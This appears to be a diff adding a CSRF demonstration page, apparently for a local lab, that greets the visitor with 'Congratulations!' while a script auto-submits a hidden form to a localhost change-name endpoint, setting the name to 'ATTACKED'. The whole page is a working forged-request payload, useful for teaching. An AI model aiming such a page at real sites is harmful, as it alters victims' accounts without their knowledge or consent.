@@ -1,0 +1,25 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+    <meta charset="UTF-8">
+    <title>CSRF Demo</title>
+</head>
+<body>
+    <h1>Congratulations!</h1>
+
+    <form
+        action="https://localhost:8443/change-name"
+        method="POST"
+    >
+        <input
+            type="hidden"
+            name="name"
+            value="ATTACKED"
+        >
+    </form>
+
+    <script>
+        document.forms[0].submit();
+    </script>
+</body>
+</html>
